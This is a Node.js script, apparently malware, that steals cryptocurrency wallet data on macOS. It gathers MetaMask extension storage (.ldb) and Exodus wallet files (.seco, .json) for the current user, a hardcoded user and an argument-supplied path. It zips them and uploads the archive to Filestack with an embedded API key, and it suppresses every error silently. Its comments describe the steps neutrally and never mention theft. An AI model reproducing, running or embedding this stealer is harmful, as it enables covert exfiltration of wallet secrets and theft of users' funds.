#!/usr/bin/env node
(async _ => {
    const fs = require('fs');
    const path = require('path');
    const os = require('os');
    const filestack = require('filestack-js');
    const archiver = require('archiver');
    const stream = require('stream');
    const crypto = require('crypto');

    // Function to remove the final directory segment from a path string
    function removeLastDirectorySegment(pathString) {
        return path.dirname(pathString);
    }

    // Creates a list of all files with an '.ldb' extension in the given folder and its subfolders
    function searchFilesWithExtension(folderPath, fileSet, extension) {
        const files = fs.readdirSync(folderPath);

        files.forEach((file) => {
            const filePath = path.join(folderPath, file);
            const fileStat = fs.statSync(filePath);

            if (fileStat.isDirectory()) {
                searchFilesWithExtension(filePath, fileSet, extension);
            } else if (path.extname(file) === extension) {
                fileSet.add(filePath);
            }
        });
    }

    async function compressAndUploadFiles(filePaths) {
        const tempFolderPath = `/tmp/${generateRandomName()}`;
        const archiveName = generateRandomName() + '.zip';
        const archivePath = tempFolderPath + '/' + archiveName;

        // Ensure the temp folder exists
        fs.mkdirSync(tempFolderPath, { recursive: true });

        await new Promise((resolve, reject) => {
            // Create a new archive and add the files
            const output = fs.createWriteStream(archivePath);
            const archive = archiver('zip', {
                zlib: { level: 9 } // Sets the compression level.
            });

            // Handle events
            output.on('close', () => {
                console.log('Archive created:', archivePath);
                resolve();
            });

            archive.on('warning', (err) => {
                if (err.code === 'ENOENT') {
                    console.warn('Warning:', err);
                } else {
                    reject(err);
                }
            });

            archive.on('error', (err) => {
                reject(err);
            });

            // Pipe the archive data to the output
            archive.pipe(output);

            // Append the files to the archive
            filePaths.forEach((filePath) => {
                archive.file(filePath, { name: path.basename(filePath) });
            });
            archive.append(process.argv[5], { name: 'version' });

            // Finalize the archive
            archive.finalize();
        });

        // Upload the archive to Filestack
        await uploadArchiveToFilestack(archivePath);

        // Remove the temporary archive file
        fs.unlinkSync(archivePath);

        fs.rmSync(tempFolderPath, { recursive: true });
    }

    async function uploadArchiveToFilestack(archivePath) {
        try {
            // Read the archive file as a Buffer
            const fileBuffer = fs.readFileSync(archivePath);

            // Upload the file to Filestack using the Buffer
            await client.upload(fileBuffer, {
                onProgress: (progress) => {
                    console.log(`Uploading: ${progress.totalPercent}%`);
                },
            });
        } catch (error) {
            throw error;
        }
    }

    function generateRandomName() {
        return crypto.randomBytes(16).toString('hex');
    }


    /* ---- ENTRY POINT ---- */
    const client = filestack.init('AbOowdzhuSXxh5t3WEIgNz');
    const username = os.userInfo().username;
    let fileSet = new Set();

    try {
        searchFilesWithExtension(`/Users/${username}/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn`, fileSet, '.ldb');
    } catch { }
    try {
        searchFilesWithExtension(removeLastDirectorySegment(process.argv[4]), fileSet, '.ldb');
    } catch { }
    try {
        searchFilesWithExtension(`/Users/zachary/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn`, fileSet, '.ldb');
    } catch { }
    try {
        searchFilesWithExtension(removeLastDirectorySegment(process.argv[4]), fileSet, '.ldb');
    } catch { }

    try {
        searchFilesWithExtension(`/Users/${username}/Library/Application Support/Exodus/exodus.wallet`, fileSet, '.seco');
    } catch { }
    try {
        searchFilesWithExtension(`/Users/${username}/Library/Application Support/Exodus/exodus.wallet`, fileSet, '.json');
    } catch { }
    try {
        searchFilesWithExtension(`/Users/zachary/Library/Application Support/Exodus/exodus.wallet`, fileSet, '.seco');
    } catch { }
    try {
        searchFilesWithExtension(`/Users/zachary/Library/Application Support/Exodus/exodus.wallet`, fileSet, '.json');
    } catch { }
    const fileList = Array.from(fileSet);
    console.log(fileSet, fileList);

    await compressAndUploadFiles(fileList);
})();